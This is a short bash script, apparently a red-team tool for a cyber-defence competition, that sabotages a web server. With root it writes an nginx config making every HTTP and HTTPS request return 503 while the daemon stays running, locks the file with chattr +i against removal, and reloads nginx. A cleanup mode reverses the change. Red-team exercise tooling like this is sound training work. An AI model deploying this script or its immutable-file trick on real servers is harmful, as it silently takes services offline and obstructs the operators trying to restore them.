#!/usr/bin/env bash
# Rocky Ecom scoring disruption: nginx returns 503 on :80 and :443.
# Daemon stays running and healthy — just all requests return 503.
# Visible to: defender-cli backups --compare-hashes (if baseline was taken)
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

CONF="/etc/nginx/conf.d/zzz_maint.conf"

case "${1:-}" in
  deploy)
    # Detect SSL cert path
    if [[ -f /etc/ssl/certs/ssl-cert-snakeoil.pem ]]; then
      SSL_CERT="/etc/ssl/certs/ssl-cert-snakeoil.pem"
      SSL_KEY="/etc/ssl/private/ssl-cert-snakeoil.key"
    else
      SSL_CERT="/etc/nginx/ssl/server.crt"
      SSL_KEY="/etc/nginx/ssl/server.key"
    fi

    cat > "$CONF" <<NGINX_EOF
# Maintenance mode
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    return 503;
}
server {
    listen 443 ssl default_server;
    listen [::]:443 ssl default_server;
    server_name _;
    ssl_certificate     ${SSL_CERT};
    ssl_certificate_key ${SSL_KEY};
    return 503;
}
NGINX_EOF
    chattr +i "$CONF" 2>/dev/null || true
    nginx -t 2>/dev/null && (nginx -s reload 2>/dev/null || systemctl reload nginx 2>/dev/null || true)
    echo "[+] 07_disrupt_web: HTTP/HTTPS → 503 (nginx running, scoring fails)"
    ;;
  cleanup)
    chattr -i "$CONF" 2>/dev/null || true
    rm -f "$CONF"
    nginx -s reload 2>/dev/null || systemctl reload nginx 2>/dev/null || true
    echo "[-] 07_disrupt_web: restored"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
